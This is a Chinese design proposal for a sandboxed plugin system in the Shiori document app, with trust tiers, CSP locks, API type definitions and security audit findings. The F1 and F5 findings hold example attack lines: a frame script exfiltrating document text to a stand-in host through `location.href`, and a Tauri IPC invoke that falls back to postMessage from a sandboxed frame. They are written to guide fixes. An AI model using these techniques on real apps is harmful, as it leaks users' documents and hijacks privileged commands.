# 插件系统：先定信任边界，再套 API

2026-10-20 · 提案，未开工。来自同日的全面审计（[`AUDIT-2026-10-20.md`](AUDIT-2026-10-20.md)）。参考了 Cordis
`4.0.0-rc.11`（commit `df4431e`）和 DeepSeek Harness（下称 dsh）`0.2.1-rc.2`
（commit `687f282`）的一手源码，两者只借设计，都不进依赖。本文的 Tauri / wry
行为按仓库锁定的版本核对过：`src-tauri/Cargo.lock` 里是 `tauri 2.11.5`、
`wry 0.55.1`。

## Why

Jesse 要「全面支持插件系统」。Shiori 现在只有一个 interface 形状、能替换的
seam，就是 `PdfEngine`（`src/pdf/engine/appEngine.ts:40`）。其余扩展点都是闭合
的 string union，按类型分支散在几十个文件里：

| Union | 位置 |
| --- | --- |
| `ToolId` | `src/pdf/model/types.ts:311` |
| `Overlay` / `OverlayType` | `src/pdf/model/types.ts:296`、`:309` |
| `RailTab` | `src/editor/store/store.ts:124` |
| `DocumentKind` | `src/documents/types.ts:1` |
| `ExportMode` | `src/pdf/export/exportPdf.ts:124` |
| `PrefsTheme` | `src/editor/store/store.ts:119` |

因此加一种 agent CLI、一个快捷键或一种导出，都得同时改 Rust、TS 和测试。

两个参考物在这件事上方向相反。Cordis 的生命周期设计是对的：每个注册都是一个
effect，卸载时自动撤销；依赖的 service 没到位，插件就不启动；依赖方先于
provider 卸载。但 Cordis 和 dsh 都让插件以受信任代码的身份跑在宿主 realm 里，dsh 的
`SAFETY.md` 写的是 "untrusted plugins may damage the host"。Shiori 的承诺是
local-first 和隐私（`tauri.conf.json` long description："Everything stays on
your machine"）。在 Tauri 主 webview 里照搬这套做法，等于把 `desktop-app-commands`
整包交给第三方，也违反 fact 3。

所以这份方案按这个顺序来：先定代码在哪里跑、能碰什么，再把 API 套上去。
生命周期模型从 Cordis 借，信任模型不借。迁移规则借 seams-first：每一步先拿内置
功能证明 API 够用，并且单独修掉一个已知问题。

## 结论

1. **四层信任。**
   - T0 内置：编进 bundle，跑在主 realm。
   - T1 声明式数据包：没有代码。
   - T2 沙箱代码：opaque-origin iframe，能力通过 MessagePort 走 RPC。
   - T3 外部进程：就是现有的 Live API，只在桌面。

   第三方代码**永远不进主 webview**。Rust 侧没有插件、动态库，也不在运行时加载
   Tauri plugin。
2. **权限是闭合枚举。** 每一项都落到同一条链上：主 realm 里的 broker 方法 →
   `src/platform/` helper → 一个已经授予 `main` 的现有命令。P1–P4 不改
   capability、permission TOML 或 `APP_COMMANDS`。CSP 只收紧不放宽：web 要补一份，
   `tauri.conf.json` 不动。v1 没有网络权限。
3. **所有注册都返回 disposer**，按 Cordis 的 effect 模型回收。启用和禁用就是
   dispose 再重新 apply，不用重启 app。插件 overlay 自带缓存的外观，插件卸载后
   照常渲染和导出。
4. **加一种 overlay 却漏写导出，会变成编译错误。** 做法是一张静态的穷尽表
   `OVERLAY_KINDS: { [K in OverlayType]: … }`，ext overlay 也是表里的一员。
5. **内置功能一步一步迁上内核。** 消费方留在原地，只把它读的硬表换成 registry
   snapshot。每一步都先写出会失败的检查，每一步是一个独立的 change。
6. **有两个前置条件，不满足就不开 T2。**
   - **F1**（已实测）：web 版没有 CSP，沙箱 frame 可以靠自我导航把数据带出去。这是
     已上线的 run-mode HTML 的 bug，和插件做不做无关，应当立刻单独修（见「第一步
     建议」）。
   - **F5**（从源码推断，未实测）：Windows 上 Tauri 的 init script 会注入子 frame。
     沙箱 frame 里 IPC 能不能被挡住，最后只取决于 WebView2 的一个投递行为。不实测
     就不能对 Windows 做任何沙箱承诺。

## Phase 0 发现（均为 known=false）

### F1 · web 版的 run-mode HTML 能靠自我导航外传数据，`navigate-to 'none'` 不起作用

`src/documents/runnableHtml.ts:182-201` 注入的 frame CSP 靠 `navigate-to` 挡导航：

```ts
  // User-approved origins widen exactly one resource-fetching directive each.
  // connect-src / form-action / base-uri / navigate-to stay 'none' regardless,
  // so even an approved remote script cannot phone home, ...
    "connect-src 'none'",
    "form-action 'none'",
    "base-uri 'none'",
    "navigate-to 'none'",
```

- **`navigate-to` 没人实现。** 它已经从 CSP3 草案里删掉，主流浏览器都不支持。
- **桥脚本只拦点击。** `runnableHtml.ts:386-395` 只在 `<a href>` 被点击时
  `preventDefault`，挡不住脚本直接给 `location.href` 赋值。
- **真正能挡住子 frame 导航的是父文档的 `frame-src`。**
  - 桌面有：`src-tauri/tauri.conf.json:28` 是 `frame-src 'self' blob:`。
  - web 没有：`index.html` 里没有 meta CSP；根目录 `public/` 下只有 `brand/`，没有
    `_headers`；`vite.config.ts` 也不注入 CSP。仓库里唯一的 `_headers` 是营销站的
    `site/public/_headers`。
- **web 版能开 run mode。**
  `src/editor/components/DocumentViewerHtml.tsx:647` 的
  `const canRun = !loading && !error && hasScript;` 不看平台。

实测环境是本机 Chrome 的 isolated context，与 app 同构：blob: 文档、
`sandbox="allow-scripts"`、`data:` 脚本、上面这份 CSP。

| 父文档 CSP | frame 内执行 `location.href='https://example.org/?leak=probe'` |
| --- | --- |
| 无（web 版现状） | 网络日志里出现 `GET https://example.org/?leak=probe [200]` |
| `frame-src 'self' blob:`（桌面现状） | 触发 `securitypolicyviolation: frame-src`，没有发出请求 |

- **场景**：在 `app.shiori.nagi.fun` 打开一个 HTML 文档并点「运行」，文档脚本执行
  `location.href = "https://x/?" + encodeURIComponent(document.body.innerText)`，
  文档内容就离开了机器，而代码注释承诺的是 "cannot phone home"。
- **对插件的意义**：T2 用的是同一套容器。web 版不补父级 CSP，任何插件拿到的文档
  文本都能用这个办法带走。
- **修法分两步，原因是部署环境的约束。** web 版部署在 Cloudflare Pages
  （`docs/BUILD-AND-RELEASE.md:78`），而且 2026-10-16 起开着 Cloudflare Web
  Analytics。这个统计是在 Cloudflare 那边开的，beacon 脚本由 Cloudflare 注入
  HTML，仓库里没有对应代码（同文件 :94-96）。如果直接把 `tauri.conf.json:28` 的
  `script-src 'self' …` 镜像过去，beacon 会被拦掉。
  1. **立即做**：新建 `public/_headers`，只加一行
     `Content-Security-Policy: frame-src 'self' blob:`。Vite 会把 `public/` 拷进
     `dist/`，Pages 读取产物根目录下的 `_headers`。同时删掉 `navigate-to 'none'`
     和 :182-184 注释里的承诺。这一步不碰 `script-src`，所以 beacon 和 run mode
     里用户批准的远程源都不受影响。
  2. **P0 跟进**：补完整的 web CSP，镜像桌面那份，但去掉 `ipc:` 和 `asset:`，并显式
     放行 `https://static.cloudflareinsights.com`（script）和
     `https://cloudflareinsights.com`（connect）。
- **还没测的平台和通道**：WebKit（WKWebView / WebKitGTK）和 Android WebView 上的
  行为没测。WebRTC（`RTCPeerConnection`）可以绕过 `connect-src`，是已知通道，也
  没测。两者都放进 P0 的 `plugins-sandbox-escape` 探针。

### F2 · 草稿 history 会静默丢掉含未知 overlay 类型的条目

- `src/storage/drafts.ts:393` 的 `isOverlay` 遇到未知 `type` 返回 false。
- `:512` 的 `!value.overlays.every(isOverlay)` 因此让整个 `DocumentModel` 判为无效。
- `:557-565` 的 `sanitizeHistory` 把这样的条目整条 `filter` 掉：

```ts
function sanitizeHistory(value: unknown): HistoryEntry[] {
  if (!Array.isArray(value)) return [];
  return value.filter((entry): entry is HistoryEntry => {
    if (!isRecord(entry)) return false;
    return entry.kind === "overlay-batch"
      ? isOverlayBatchHistoryEntry(entry)
      : isDocumentModel(entry);
  });
}
```

- **场景**：插件新增了一种 overlay 类型，用户画了 3 次后重启 app，undo 栈里这 3 段
  就没了，撤销直接跳过它们，也不报错。fact 4 的恢复承诺因此被打破。不装插件也会
  触发：新版 Shiori 写下一种新 overlay 类型，再用旧版打开同一份草稿。
- **修法**：见「Overlay 扩展形状」，校验器在结构上接受 `type: "ext"`。

### F3 · 导出遇到没登记的 overlay 类型会静默丢弃，没有任何守卫

- `src/pdf/export/annotations.ts:447-481`：`buildAnnotRef` 是一串 `if`，最后是
  `void ctx; return null;`。
- `src/pdf/export/exportPdf.ts:966-975`：flatten 是一条 `else if` 链，没有 `else`。
- 全仓 grep `assertNever` 或 `: never =`，结果为零。

所以给 `Overlay` union 加一个成员时，编译、lint、测试都能通过，但导出的 PDF 里没有
这个标注，`lostChars` 不计数，`ExportIntegrityError`（`exportPdf.ts:206`）也不会
抛出。

- **场景**：任何新增的 overlay 类型，无论来自插件还是内置，在 `annotations` 或
  `flatten` 模式下导出，PDF 里都少了它，用户不会收到任何提示。
- **修法**：用静态穷尽表把这件事变成编译错误（下文 `OVERLAY_KINDS`）。ext overlay
  缺外观时拒绝导出。

### F4 · Agent CLI 的门槛比实际机制更严

- `src-tauri/src/agent_clis.rs:13-16` 写死了 `{ claude_code: bool, codex: bool }`。
- `:30-33` 只探测 `"claude"` 和 `"codex"`。
- `src/platform/agentCli.ts:31-33` 的判断是
  `return availability.claudeCode || availability.codex;`。
- 这个结果决定 `CalloutThreadPanel.tsx:358` 显示不显示追问控件。

而 `src/live/followUpLoop.ts:165` 的 `sendCalloutFollowUp` 只是往最近的终端会话的
stdin 写一段提示词，然后单独写一次回车。它跟具体是哪个 agent 无关，只要求这个
agent 能跑 shell。

- **场景**：用户只装了 `gemini`，看不到 callout 的追问控件，尽管注入对它是可用的。
- **修法**：P1a 把名单做成数据（见下文）。

### F5 · Windows 上沙箱 frame 的 IPC 隔离只剩一把没验证过的锁（从源码推断，未实测）

三份候选方案都把 Tauri IPC 在 sandbox iframe 里的锁当成同一套，按源码看，各平台
其实相反：

- wry `0.55.1` 的 `src/lib.rs:990`：
  "**Windows:** scripts are always added to subframes regardless of the
  `for_main_frame_only` option."
- Tauri 把 `__TAURI_INTERNALS__`、invoke script、core script（里面就是 invoke key）
  都包成 `for_main_frame_only: true`（`tauri-2.11.5/src/manager/webview.rs:159-200`、
  `:415`）。这个开关在 Windows 上被忽略，所以 run-mode HTML 和将来的插件 frame 里
  **都有 invoke key**。
- frame 的 `connect-src 'none'` 确实会拦住 `fetch(http://ipc.localhost/…)`。但 Tauri
  的 `scripts/ipc-protocol.js:59-67` 在 fetch 失败后会改走另一条路：

  ```js
  // failed to use the custom protocol IPC (either the webview blocked a custom protocol or it was a CSP error)
  // so we need to fallback to the postMessage interface
  customProtocolIpcFailed = true
  sendIpcMessage(message)
  ```

  也就是带着合法的 key，走 `window.ipc.postMessage`，再到
  `window.chrome.webview.postMessage`（wry `webview2/mod.rs:885`）。
- Rust 端 `handle_ipc_message`（`ipc/protocol.rs:185-310`）不看是哪个 frame 发来的。
  `webview/mod.rs:1747-1748` 只比对 invoke key，Shiori 的 `enforce_main_webview`
  （`src-tauri/src/lib.rs:53`）只比对 webview label，而 iframe 也属于 `"main"`。
- 于是唯一剩下的锁，是 **WebView2 会不会把子 frame 的 `chrome.webview.postMessage`
  投递到 wry 订阅的 `ICoreWebView2::add_WebMessageReceived`**（`webview2/mod.rs:890`）。
  按 WebView2 文档，子 frame 的消息走的是 `CoreWebView2Frame`，wry 没订阅它。这一条
  是推断，还没实测。

各平台的对照：

| 平台 | 插件 / run-mode frame 里能看到什么 | 真正挡住 IPC 的锁 | 依据 |
| --- | --- | --- | --- |
| macOS（WKWebView） | `window.webkit.messageHandlers.ipc` 对所有 frame 可见；`window.ipc` 包装是 main-only（wry `wkwebview/mod.rs:637-641`，`init(..., true)`）；没有 invoke key | per-launch invoke key：只注入主 frame，`webview/mod.rs:1748` 比对失败直接 `return` | 源码；待探针确认 |
| Windows（WebView2） | `__TAURI_INTERNALS__`、invoke key、`window.ipc` 全都有 | WebView2 不把子 frame 的 postMessage 投递到顶层 handler | **推断，未实测** |
| Linux（WebKitGTK） | 未查源码 | 预期与 macOS 相同（invoke key） | 待探针 |
| Android | Tauri 在 Android 上不走 custom protocol（`ipc-protocol.js:20` `canUseCustomProtocol = osName !== 'android'`）；`window.ipc` 对子 frame 是否可见未查 | 预期是 invoke key（wry `lib.rs:991`：不支持 `addDocumentStartJavaScript` 时只注入主 frame） | 待探针 |
| web | 没有 Tauri | sandbox + frame 内 CSP + 父级 `frame-src`（F1） | 实测（Chrome） |

- **场景**：Windows 桌面上，用户运行一个 HTML 文档（今天就能做），文档脚本调用
  `window.__TAURI_INTERNALS__.invoke("terminal_write", …)`。fetch 被 CSP 拦下后，请求
  回落到 postMessage。只要 WebView2 把它投递到顶层，这段脚本就拿到了全部
  `desktop-app-commands`。
- **修法**：P0 探针的第二项，在 Windows 上实测 `__TAURI_INTERNALS__.invoke`、
  `window.ipc.postMessage`、`chrome.webview.postMessage` 三条路。不过就有两件事要做：
  一是 Windows 不开 T2；二是 run-mode HTML 在 Windows 上要另想隔离办法，这本身就是
  一个 bug fix，和插件无关。另外，Tauri 或 wry 的每次升级都触发重跑这个探针。

### F6 · registry 里的 i18n key 逃过了 `keys.test.ts`

`src/i18n/keys.test.ts:57` 只匹配字面量
`/\bt\(\s*"([a-zA-Z0-9_.]+)"/g`。`:102` 的 "zh and ja carry exactly the keys en
does" 能保证三份 locale 的 key 集合一致，但查不出「代码引用了、`en` 里根本没有」的
key。今天已经有例子：`ContextualToolbar.tsx:209-220` 的
`TOOLS[].i18nKey: "tools.select"` 在 `:646` 以 `t(tl.i18nKey)` 读取，不受字面量检查
覆盖。

- **场景**：registry 化之后，`titleKey` / `labelKey` 都成了数据字段。写错一个 key，
  测试照样全绿，界面上显示的是原始 key 字符串，违反 fact 6。
- **修法**：给第一个 registry 加一条静态检查，并且和它放在**同一个 change** 里上线
  （P1b）。检查的做法是：在测试里激活全部内置插件，遍历每个 registry 的 key 字段，
  断言每个 key 在 `en.json` 里都存在。

## 信任模型：代码在哪里跑

| 层 | 是什么 | 运行位置 | web | 桌面 | Android | iOS |
| --- | --- | --- | --- | --- | --- | --- |
| T0 内置 | 编进 bundle 的一方模块，直接用内核 API | 主 realm | 是 | 是 | 是 | 是 |
| T1 声明式 | 只有 manifest 和 JSON：快捷键方案、stamp、设置默认值、额外 locale 文案 | 宿主解释数据，不执行任何代码 | 是 | 是 | 是 | 是 |
| T2 沙箱代码 | 单文件 ES bundle | opaque-origin `<iframe sandbox="allow-scripts">`，blob: 文档、`data:` 脚本、注入的 CSP，能力走 transfer 过去的 `MessagePort` | F1 修完且探针通过后开 | macOS / Linux 探针通过后开；Windows 要等 F5 | 探针通过后开 | 待定（拍板 3） |
| T3 外部进程 | 用户自己跑的进程（CLI、agent、脚本） | 主机进程，经 Live API：`live_api.rs:241` 绑 `127.0.0.1:0`，bearer token，descriptor 文件权限 `0o600`（`:667`） | 否 | 是 | 否 | 否 |

T1 **不能**新增 agent CLI 名。这个名单在 Rust 的 const 表里，随 app 发布（P1a），
这样 `detect_agent_clis` 的输入面不会扩大。

为什么 T2 选 iframe，下面这些都否决了：

- **主 realm（dsh 的做法）。** 插件会拿到 `__TAURI_INTERNALS__`、全部
  `desktop-app-commands`、IndexedDB 里的草稿和 localStorage 里的 prefs。
  `script-src 'self' data:` 里的 `data:` 是给 run mode 用的，插件加载器**不能**借它
  往主 realm 注入代码（不变量 1）。fact 3 的 ESLint 规则（`eslint.config.js:53-55`）
  只管源码里的 import，挡不住运行时访问 `window.__TAURI_INTERNALS__`。
- **主 origin 下的 Worker。** 碰不到 DOM，但和主页面同源，能直接打开 IndexedDB，
  而草稿全在里面（fact 4）。Worker 只能开在沙箱 frame 内部：那里是 opaque origin，
  打开 IndexedDB 会抛 SecurityError。frame 里能不能按 `worker-src 'self' blob:` 起
  blob Worker，由 P0 探针确认。
- **每个插件一个 Tauri child webview。** 只有桌面有：`src/platform/index.ts:138-140`
  的 `CAPABILITIES` 注释写明 mobile 没有 multi-webview。Windows 上 `add_child` 冻结
  过（POSTMORTEMS 2026-06-15，:898、:942-947）。ACL 测试还断言
  `webviews == ["main"]`（`lib.rs:98`），开一个新 webview 就得改这条不变量。
- **Rust 侧插件：动态库，或运行时 `.plugin()`。** 命令集是闭合的，有测试守着：
  `src-tauri/src/app_commands.rs` 的 `APP_COMMANDS` 必须等于 `collect_commands!` ∪
  `generate_handler!`，也必须等于 permission TOML（`lib.rs` 的 ACL 测试，约
  :65-230）。fact 7 要求每个 Tauri plugin 都在 `run()` 里 `.plugin()`。下载下来的
  `.so` / `.dylib` 过不了 macOS hardened runtime 的 library validation，也违反 Play 的
  Device and Network Abuse 政策。
- **Node `vm` / 在 CLI 里执行插件。** dsh 自己写明它 "is not a security boundary"。
  CLI v1 不执行插件，只做 pack / verify / inspect。

T2 的锁沿用 run mode 的两把，再加两把：

1. **iframe sandbox 只给 `allow-scripts`。** 不给 `allow-same-origin`、
   `allow-popups`、`allow-forms`、`allow-top-navigation*`、`allow-modals`。
   先例是 `DocumentViewerHtml.tsx:1052`。
2. **注入的 CSP**：`default-src 'none'; script-src data:; style-src 'unsafe-inline';
   img-src data: blob:; font-src data:; connect-src 'none'; form-action 'none';
   base-uri 'none'`。插件 bundle 没有「批准远程源」这条路，run mode 的
   `allowRemoteOrigins` 不复用。
3. **父级 `frame-src 'self' blob:`**，挡住自我导航。桌面已经有，web 靠 F1 补上。
4. **桥只认 `MessagePort`。** 宿主建一个 `MessageChannel`，在 frame 第一次 `load`
   之后 `postMessage(init, "*", [port2])`，此后所有 RPC 都走这个 port。`window` 上的
   `message` 事件只用来握手，判定条件沿用 `event.source === iframe.contentWindow`
   （`DocumentViewerHtml.tsx:951`）。插件 id 取自 frame 的绑定关系，消息里自带的 id
   一律不信。

这四把锁都建立在一个前提上：**blob: 文档里的 `<meta http-equiv=CSP>` 会被尊重。**
这一点只在 Chrome 上验证过，所以它是 P0 探针的第一项。哪个平台不过，哪个平台就
没有 T2。

隐私文案按真实的边界写。沙箱能保证的是：插件**拿不到没给它的数据**。至于拿到的
数据「出不去」，要等 F1 修完、WebRTC 探针也过了才能写。设置页的权限说明不承诺比这
更多的东西。

## 贡献点

贡献点照 dsh SlotMap 的做法做成 declaration-merged：每个点先用
`defineContributionPoint` 声明，再在 `interface ContributionPoints` 上做声明合并。
往一个没声明的点贡献，或者同一个点被声明两次，都会让插件**在激活时**直接
`failed`，不会静默。

| 贡献点 | 现在的接缝 | 层 | 阶段 | 说明 |
| --- | --- | --- | --- | --- |
| agent CLI | `agent_clis.rs:13-33`、`host_tools.rs:32`/`:80`、`agentCli.ts:3-33`、`bindings.ts:413` | 只有 T0 | P1a | Rust const 表（F4） |
| command | 不存在，全仓没有 command 层 | T0 T2 | P1b | 新文件 `src/plugins/registries/commands.ts`；命令面板由它派生（是否做见拍板 9） |
| keybinding | `canvasKeymap.ts:45-55` 的 `TOOL_KEYS` 和 `:110`（⇧U 对应 strikethrough）、`useAppShortcuts.ts:58-101`、`ShortcutsSheet.tsx:40` 的 `GROUPS`、`ContextualToolbar.tsx:209-220` 的 `hint` | T0 T1 T2 | P1b | 一张表派生出三处，消掉三份手写副本 |
| 原生菜单派发 | `src/App/nativeMenu.ts` | T0 | P1b 尾 | 每个 channel 改成调 `commands.run(id)`；Rust 菜单表不动 |
| rail panel | `store.ts:124` 的 `RailTab`、`RightRail.tsx:364-387` 的 `tabs`、`:157`/`:184` 的挂载状态 | T0 T2 | P1c（T0）/ P3（T2） | `RailTab` 加 `` `ext:${string}` `` |
| 设置分区 | `SettingsPanel.tsx` 里 6 个手排的 `<Section>` | T0 T1 T2 | P1c | 插件设置**不进** `Prefs`，单独存在 `shiori:plugin:<id>:settings` |
| locale 文案 | `src/i18n/index.ts:30-34` 只有一个 `translation` namespace | T0 T1 T2 | P2 | 每个插件一个 namespace，用 `addResourceBundle` 加载，dispose 时移除 |
| 文档动作 | `liveApiBridge.ts:258` 的 `applyLiveAnnotationRequest`、`spec.ts:11` 的 `ANNOTATION_SPEC_SCHEMA = "shiori.annotations/v1"` | T2 T3 | P3 | 读文本、写标注；写入和 CLI / agent 走同一条带校验和上限的路径 |
| exporter | `ExportDialog.tsx:120` 的 `EXPORT_MODES`、`src/editor/export/exportPlatformAdapter.ts` | T2 | P3 | 只产出非 PDF 格式；PDF 写入器仍然只有一个（fact 2） |
| overlay kind + 工具 | `types.ts:296`/`:311`、`drafts.ts:393`、`annotations.ts:447`、`exportPdf.ts:966` | 静态表（T0）+ ext（T2） | P0c / P4 | 见「Overlay 扩展形状」 |
| 文档类型 | `documents/types.ts:1`、`WorkspaceView.tsx:61` 的 `WorkspaceViewports`、`src/platform/open.ts`、`documents/mod.rs:105-112`/`:253`/`:551` | T2 | P5 | 只能在 app 内打开；系统文件关联和 Android intent 是构建期产物 |
| 原生菜单段 | `window_chrome.rs:358-377` 的 `on_menu_event` `match` | T0 T2 | P5 | 要新增一个 Rust 命令；Windows 上菜单是隐藏的（`lib.rs:491-493` 的 `hide_menu`），mobile 和 web 没有菜单，所以菜单只是 command 的镜像 |
| Live API 操作 | `live_api.rs:1036-1038` 的两条路由 | T3 | P6 | 外部进程插件就是 Live API 客户端；不新开 MCP |

**不开放的东西：**

- 替换 `PdfEngine`（fact 2），只暴露一个只读子集；
- PDF 写入器；
- 草稿存储；
- 让终端启动任意命令；
- 外部终端 enum；
- CLI 子命令；
- Tauri 命令；
- built-in-only 的 waterfall（`export/before`、`document/resolveOpen`），第三方不能
  hook。

Markdown 的 CodeMirror keymap（`MarkdownLiveEditorCore.ts`）和 DOCX 编辑器不在 v1 的
keybinding scope 里，scope 只有 `global | canvas`。等这张表稳定之后，CodeMirror 那边
用一个 `keymap.of(deriveCodeMirrorKeymap(snapshot))` 的 compartment 读同一张表，
单独开一个 change。

## 内核 API

内核是纯 TS 模块，放在新目录 `src/plugins/kernel/` 下。它不 import React，不
import `@tauri-apps/*`，也不 import `src/platform/`，这条用 ESLint 规则约束。测试用
fake ports（fact 11）。T0 拿到的是 `PluginContext` 本身；T2 拿到的是同形状的 RPC
代理（新文件 `src/plugins/sandbox/client.ts`，打进 SDK），所有参数和返回值都必须能
做结构化克隆，函数只存在于 frame 内部。

```ts
// src/plugins/kernel/types.ts（新）
export type PluginId = string;                 // 反向域名：dev.example.wordcount；内置是 shiori.*
export type Disposer = () => void | Promise<void>;
export type JsonValue =
  | null | boolean | number | string | JsonValue[] | { [k: string]: JsonValue };

export const SHIORI_PLUGIN_API = 1 as const;   // 整数，和 calver 无关
export type PluginApiVersion = typeof SHIORI_PLUGIN_API;
export type CapabilityName = keyof typeof CAPABILITIES;   // src/platform/index.ts:134
export type PlatformLabel = "web" | "desktop" | "android" | "ios"; // 与 PLATFORM_LABEL（:118）同值

/** dsh SlotMap：贡献点声明合并到这里；未声明的点在激活时 fail。 */
export interface ContributionPoints {}
export function defineContributionPoint<K extends keyof ContributionPoints>(
  key: K,
  spec: { cardinality: "keyed" | "list"; tiers: readonly ("T0" | "T1" | "T2")[] },
): void;                                       // 同一个 key 声明两次时抛错

export interface PluginContext {
  readonly id: PluginId;
  readonly api: PluginApiVersion;
  readonly platform: { label: PlatformLabel; capabilities: readonly CapabilityName[] };
  readonly signal: AbortSignal;                // dispose 时 abort
  readonly log: { info(m: string): void; warn(m: string): void; error(m: string): void };

  /** Cordis 式 effect：返回的 disposer 在卸载时逆序执行；卸载后再调用抛 INACTIVE_EFFECT。 */
  effect(setup: () => Disposer | void | Promise<Disposer | void>): void;
  contribute<K extends keyof ContributionPoints>(point: K, item: ContributionPoints[K]): Disposer;

  readonly t: (key: string, vars?: Record<string, string | number>) => string;
  readonly settings: PluginSettings;
  readonly storage: PluginStorage;
  readonly events: PluginEvents;
  readonly documents: DocumentsApi;            // 权限门控
  readonly annotations: AnnotationsApi;        // 权限门控
  readonly host: HostApi;                      // toast、确认框、剪贴板、终端注入
}

// —— 贡献形状（每个都在 ContributionPoints 上声明合并）——
export interface CommandContribution {
  id: `${PluginId}.${string}`;
  titleKey: string;                            // 插件 namespace 内的 i18n key
  when?: WhenClause;                           // 声明式，不引入表达式语言
  sheetGroup?: "tools" | "edit" | "navigation" | "zoom";
  run(args: { documentId: DocumentId | null }): Promise<void> | void;
}
export type WhenClause = {
  documentKind?: readonly DocumentKind[];
  hasSelection?: boolean;
  platform?: readonly PlatformLabel[];
};

export interface KeybindingContribution {
  command: string;
  chord: { key: string; mod?: boolean; shift?: boolean; alt?: boolean }; // 字形复用 src/platform/keys.ts
  scope: "global" | "canvas";
  /** 仅 global：在 editable guard 之前判断（⌘S 的现有语义，useAppShortcuts.ts:71-90）。 */
  beforeEditableGuard?: boolean;               // 只有 T0 能设
}

export interface PanelContribution {
  id: string;
  titleKey: string;
  icon: string;                                // 包内 svg 路径，宿主净化后作为 data: img 渲染
  view: string;                                // bundle 内的 view 入口名，宿主为它另开一个 view frame
  order: number;
  when?: WhenClause;
}

export interface ExportInput {
  documentId: DocumentId;
  kind: DocumentKind;
  annotations: readonly AnnotationDigest[];    // src/live/annotationDigest.ts 的形状
  text?: readonly { page: number; text: string }[]; // 仅在有 document.text 权限时提供
}
export interface ExporterContribution {
  id: string;
  titleKey: string;
  extension: string;                           // "md"
  mimeType: string;
  run(input: ExportInput): Promise<Uint8Array>; // 宿主走 saveBytes 保存，路径由用户在对话框里选
}

// 以下声明合并分别写在 src/plugins/registries/commands.ts 等各自的文件里（同一个文件不能 augment 自己）：
declare module "../kernel/types" {
  interface ContributionPoints {
    command: CommandContribution;
    keybinding: KeybindingContribution;
    panel: PanelContribution;
    exporter: ExporterContribution;
    settingsSection: SettingsSectionContribution; // T0：render() 返回 ReactNode；T1/T2：schema
    railPanel: RailPanelContribution;              // T0：keepMounted + render()
  }
}

// —— 宿主读取一侧 ——
export interface Registry<T extends { id: string }> {
  get(id: string): Owned<T> | undefined;
  /** 冻结数组；内容不变时引用也不变，可以直接交给 useSyncExternalStore。 */
  snapshot(): readonly Owned<T>[];
  subscribe(listener: () => void): Disposer;
}
export type Owned<T> = T & { readonly owner: PluginId };

export interface Kernel {
  status(id: PluginId): PluginStatus;
  /** 同 scope、同 chord：先注册的生效，后注册的记录在这里，插件本身不会 failed。 */
  conflicts(): readonly { chord: string; scope: string; winner: PluginId; loser: PluginId }[];
  setEnabled(id: PluginId, enabled: boolean): Promise<void>;
}
export type PluginStatus =
  | "pending" | "loading" | "active" | "failed" | "unloading" | "disposed" | "unsupported";

// —— API 面（权限标注在每个方法后面）——
export interface DocumentsApi {
  active(): Promise<DocumentInfo | null>;                              // id、kind、title、pageCount；不含路径
  pageText(documentId: DocumentId, page: number): Promise<string>;     // document.text
  outline(documentId: DocumentId): Promise<OutlineNode[]>;             // document.text
  bytes(documentId: DocumentId): Promise<Uint8Array>;                  // document.bytes
  selection(): Promise<{ documentId: DocumentId; page: number; text: string } | null>; // selection.read
}
export interface AnnotationsApi {
  list(documentId: DocumentId): Promise<readonly AnnotationDigest[]>;  // annotations.read
  /** 走 parseSpec + applyLiveAnnotationRequest；一次调用就是一个 undo batch。 */
  apply(documentId: DocumentId, spec: AnnotationSpec): Promise<{ created: string[] }>; // annotations.write
}
export type PluginEventMap = {
  "document:activated": { documentId: DocumentId | null };
  "document:closed": { documentId: DocumentId };
  "selection:changed": { documentId: DocumentId };    // 200 ms 合并；内容要另外调 selection()
  "annotations:changed": { documentId: DocumentId };
};
export interface PluginEvents {
  on<K extends keyof PluginEventMap>(e: K, h: (p: PluginEventMap[K]) => void): Disposer;
}
export interface PluginStorage {               // 独立的 Dexie 库，每个插件配额 5 MB
  get(key: string): Promise<JsonValue | undefined>;
  set(key: string, value: JsonValue): Promise<void>;
  delete(key: string): Promise<void>;
}
export interface PluginSettings {
  get(): Readonly<Record<string, JsonValue>>;
  onChange(h: (next: Readonly<Record<string, JsonValue>>) => void): Disposer;
}
export interface HostApi {
  toast(message: string, tone?: "info" | "error"): void;
  confirm(message: string): Promise<boolean>;
  writeClipboard(text: string): Promise<void>;          // clipboard.write，并且只在用户手势之后
  injectTerminal(text: string): Promise<"sent" | "no-terminal">; // terminal.inject，复用 sendCalloutFollowUp
  openExternal(url: string): Promise<void>;             // external.open，每次都弹确认
}

export interface ShioriPlugin {
  activate(ctx: PluginContext): void | Promise<void>;   // T2 bundle 的默认导出
}
```

T0 另外有一层 Cordis 式的 service，只对内置插件开放：

```ts
// src/plugins/kernel/services.ts（新）
export interface ShioriServices {
  pdfReader: Pick<PdfEngine, "pageCount" | "pageText" | "outline">; // 只读门面，provider 是 appPdfEngine
  workspace: WorkspacePort;                    // src/workspace/ 的只读视图
  liveAnnotations: { apply: typeof applyLiveAnnotationRequest };
  terminal: EmbeddedTerminalPort;              // 只在 CAPABILITIES.embeddedTerminal 为 true 时 provide
  browserPanel: WebPanelPort;                  // 只在 CAPABILITIES.embeddedBrowserPanel 为 true 时 provide
}
export interface T0Module<C = void> {
  id: `shiori.${string}`;
  inject?: readonly (keyof ShioriServices)[];  // 全部 active 之前停在 pending
  Config?: StandardSchemaV1<unknown, C>;       // 校验必须同步，与 Cordis 相同
  apply(ctx: PluginContext & { use<K extends keyof ShioriServices>(k: K): ShioriServices[K] }, config: C): void;
  /** 返回 true 表示原地吸收了配置变化；返回 false 则重启（dispose 后重新 apply）。 */
  reconfigure?(ctx: PluginContext, next: C, prev: C): boolean;
}
export interface ServiceRegistry {
  provide<K extends keyof ShioriServices>(name: K, impl: ShioriServices[K]): Disposer;
}
```

- **`CAPABILITIES` 就是 service map。** capability 为 false，对应的 service 就永远
  不会 provide。`inject: ["terminal"]` 的插件在 mobile 和 web 上停在 `pending`，不必
  到处 null-check。`RightRail.tsx` 里散着十几处 `CAPABILITIES.*` 判断（如 :187、
  :383、:386、:613、:667），因此可以挪到 manifest 上。`terminalFits` 是运行时的窗口
  宽度，仍然留在 `visible()` 里。
- **epoch 重启。** epoch 由 fiber revision 加上每个被注入 service 的实现 uid 组成。
  provider 一被替换，依赖方就自动卸载并重新 apply。provider 要等所有依赖方卸完才
  卸自己。
- **`update(config)`。** 先过 `Config['~standard']` 校验，再调 `reconfigure`；
  `reconfigure` 返回 false 才重启。
- **`pdfReader` 只 provide 一次**，provider 就是 `appPdfEngine`（`appEngine.ts:40`）。
